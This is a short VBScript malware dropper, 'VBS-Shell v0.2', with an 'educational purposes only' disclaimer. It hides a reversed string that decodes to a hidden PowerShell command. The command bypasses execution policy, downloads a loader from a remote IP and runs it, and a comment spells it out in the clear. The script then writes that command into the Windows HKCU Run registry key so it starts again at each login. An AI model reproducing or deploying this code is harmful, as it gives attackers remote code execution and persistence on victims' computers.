''       / Author     : NYAN CAT
''       / Name       : VBS-Shell v0.2
''       / Contact    : https://github.com/NYAN-x-CAT
''       / This program is distributed for educational purposes only.

psLoader = StrReverse(")'txt.redaol/591.1.861.291//:ptth'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(xei dnammoc- tixeon- neddih elytswodniw- eliforpon- ssapyb ycilopnoitucexe- exe.llehsrewop\0.1v\llehSrewoPswodniW\23metsyS\swodniW\:C")

'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden -noexit -command iex(New-Object Net.WebClient).DownloadString('http://192.168.1.195/loader.txt')

''Loader = https://github.com/NYAN-x-CAT/MalwareShell/blob/master/Malware.ps1

Install(psLoader)
Execute(psLoader)

Function Execute(script)
Set objShell = CreateObject("Wscript.shell")
objShell.run(script)
End Function

Function Install(script)
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite StrReverse("llehSnayN\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH"), script, "REG_SZ"
End Function